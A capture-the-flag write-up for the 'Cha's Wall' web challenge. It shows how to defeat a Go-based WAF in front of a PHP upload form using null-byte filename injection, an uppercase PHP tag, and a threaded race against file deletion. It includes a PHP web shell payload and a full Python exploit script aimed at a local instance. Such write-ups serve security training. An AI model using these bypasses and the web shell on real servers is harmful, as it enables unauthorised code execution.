# 🚩 Cha's Wall

---

## 🧪 Challenge Environment

```bash
docker-compose up --build
```

---

## 📝 Description

- Users are assigned a **random upload directory**, e.g., `/var/www/html/uploads/<random>`.
- File upload is allowed via a form.
- The backend is accessible under `/uploads/` using Apache.
- A **Go-based WAF** (Web Application Firewall) filters upload requests.
- Uploaded files are **immediately deleted** after processing.
- Access to uploaded files requires:
  - Being an admin (`$_SESSION['admin'] == 1`)
  - Supplying the correct `passcode` (which matches `SECRET_CODE`)

---

## 🔒 WAF Filtering Behavior

- **Extension filtering** (blocks `.php`, `.php5`, `.phar`, etc.)
- **Content filtering** (blocks `<?php`)
- **Header filtering** (blocks headers containing `charset` or `encod`)
- Requests using methods other than `GET` or `POST` are blocked.

---

## 🧠 Exploit Strategy

1. **Bypass WAF extension filter** using a null byte injection:
   - Upload the file with a name like `ex.php@8`
   - Replace `@` with `\x00` in the body before sending → PHP treats it as `.php`, but WAF doesn't

2. **Bypass content filter**:
   - Use `<?PHP` instead of `<?php` → bypasses case-sensitive string check

3. **Race condition**:
   - File is deleted immediately after upload (`unlink()`), so we read it *just before it's deleted*
   - Use multithreading to increase success probability

---

## 🧬 PHP Web Shell Payload (`ex.php`)

```php
<?PHP
    system('/readflag');
?>
```

---

## 🧨 Exploit Code

```python
import threading
import requests

def upload():
    url = 'http://localhost:8000/index.php?path=/var/www/html/uploads/<your_directory>/ex.php'
    cookies = {'PHPSESSID': '<your_session_id>'}
    sess = requests.Session()
    with open('ex.php', 'rb') as file:
        files = {'file': ('ex.php@8', file)}
        request = requests.Request('POST', url, cookies=cookies, files=files)
        request = request.prepare()
        request.body = request.body.replace(b'@', b'\x00')  # Null byte injection
        response = sess.send(request)

def read():
    url = 'http://localhost:8000/uploads/<your_directory>/ex.php'
    response = requests.get(url)
    if response.status_code == 200:
        print(f"[READ STATUS]: {response.status_code}")
        print(f"[READ BODY]: {response.text}")
        if 'codegate' in response.text:
            print("[FLAG FOUND]:", response.text)
            exit(0)

for i in range(1000):  # Increase for better success rate
    t1 = threading.Thread(target=upload)
    t2 = threading.Thread(target=read)
    t1.start()
    t2.start()
```

Replace `<your_directory>` and `<your_session_id>` with actual values.

---

## 🧩 Key Concepts

### 🏃 Race Condition

- File is deleted immediately after upload
- Use threads to **read** the file *while* it's still available on disk

### 💉 Null Byte Injection

- Replace `@` in filename with `\x00` to confuse WAF vs PHP interpretation:
  - WAF sees: `ex.php@8` → allowed
  - PHP sees: `ex.php\x00` → interpreted as `ex.php`

### 🔐 Session Restriction

- Reading the uploaded file requires a valid session cookie (`PHPSESSID`) and possibly admin privileges
- Use browser dev tools or Burp Suite to extract it

---

## 🏁 Flag Captured

Example output:

```bash
[READ STATUS]: 200
[READ BODY]: codegate{example_flag_here}
```

---

## 📌 Summary

- Race conditions and WAF bypass techniques like null-byte injection and case-sensitive content filtering are crucial.
- The interaction between WAF, file system, and PHP parsing can be abused with timing attacks.
- Understanding server-side behavior and filter scope (WAF vs PHP) is key.
